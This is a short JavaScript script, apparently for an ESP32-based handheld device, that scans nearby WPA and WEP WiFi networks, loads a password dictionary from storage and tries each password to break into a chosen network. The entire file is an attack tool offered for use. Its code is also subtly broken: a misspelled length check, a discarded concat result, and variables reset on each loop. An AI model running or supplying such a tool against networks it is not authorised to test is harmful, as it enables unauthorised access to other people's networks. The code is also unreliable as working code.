

// Wifi dictionary-based attacker
// use at your own risk, some devices may lock you out as a security mechanism when spammed with this!

function wifiDictAttack(ssid, pwds) {
  var connected = false;
  // iterate over the passwords
  for( var i=0; i<pwds.length; i++ ) {
      if(!pwds[i].trim()) continue;  // skip empty lines
      //print("pwd: " + pwds[i]);
      connected = wifiConnect(ssid, 3, pwds[i]);  // timeout is 3s
      if(connected) {
	  dialogMessage("password found: " + pwds[i]);
	  return;
      }
  }
}

while(true)
{
  var network_to_attack_ssid = "";
  var passwords_to_try_arr = [];
  
  var choice = dialogChoice([
    "Scan Networks", "scan",
    "Load dict", "load",
    "Start attack", "attack",
    ]
  )
  
  if(choice=="") {
    break;  // quit
  }
  if(choice=="scan") {
    //dialogMessage("Scanning...")
    var networks = wifiScan();
    if(!networks.lenght) {
      dialogError("no wifi networks found!");
      continue;
    }
    var networks_choices = [];
    for( var i=0 ; i < networks.length; i++ ) {
	if(networks[i].encryptionType == "CCMP/WPA" || networks[i].encryptionType == "WEP") {
	  networks_choices.concat([networks[i].SSID, networks[i].SSID])
	}
    }
    network_to_attack_ssid = dialogChoice(networks_choices);
  }
  else if(choice=="load") {
    var passwords_file = dialogPickFile("/");
    if(!passwords_file) continue;
    var passwords_to_try = storageRead(passwords_file);  // MEMO: 4kb file limit -> use native open+read?
    if(!passwords_to_try) continue;
    passwords_to_try_arr = passwords_to_try.split("\n");
  }
  else if(choice=="attack") {
    if(!network_to_attack_ssid) {
      dialogError("no wifi network selected, pls rescan");
      continue;
    }
    if(!passwords_to_try_arr) {
      dialogError("no passwords dict loaded");
      continue;
    }
    //print("trying attacking network " + networks[i].SSID + " " + networks[i].MAC);
    wifiDictAttack(network_to_attack_ssid, passwords_to_try_arr);
    
    wifiDisconnect();  // avoid automatic reconnection retry to the last network
  } // end if attack
  
  fillScreen(0); // clear screen
}


// 2FIX: tries to reconnect? https://github.com/espressif/arduino-esp32/issues/7968

